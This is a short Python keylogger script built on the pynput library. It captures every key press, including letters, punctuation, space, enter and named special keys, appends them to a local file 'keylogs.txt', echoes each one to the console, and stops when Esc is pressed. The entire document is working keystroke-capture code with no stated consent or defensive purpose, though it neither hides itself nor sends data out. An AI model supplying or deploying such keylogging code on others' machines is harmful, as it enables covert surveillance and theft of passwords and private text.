import pynput
from pynput import keyboard

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            if key.char.isalnum():
                f.write(key.char)
                print(f"Logged: {key.char}")
            elif key.char in ['.', ',', '!', '?', ';', ':', '-', '_', '=', '+', '[', ']', '{', '}', '\\', '|', '/', '`', '~', '@', '#', '$', '%', '^', '&', '*', '(', ')']:
                f.write(key.char)
                print(f"Logged: {key.char}")
    except AttributeError:
        with open("keylogs.txt", "a") as f:
            if key == keyboard.Key.space:
                f.write(' ')
                print("Logged: [SPACE]")
            elif key == keyboard.Key.enter:
                f.write('\n')
                print("Logged: [ENTER]")
            elif key == keyboard.Key.tab:
                f.write('\t')
                print("Logged: [TAB]")
            else:
                f.write(f"[{key.name.upper()}]")
                print(f"Logged: [{key.name.upper()}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()